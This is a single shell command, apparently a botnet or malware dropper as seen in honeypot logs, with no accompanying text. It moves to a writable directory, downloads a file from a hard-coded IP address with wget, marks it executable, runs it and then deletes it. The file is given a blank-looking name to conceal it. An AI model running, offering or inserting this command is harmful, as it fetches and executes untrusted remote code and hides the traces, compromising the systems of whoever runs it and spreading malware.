cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.109/' '; chmod +x ' '; ./' '; rm -rf ' '
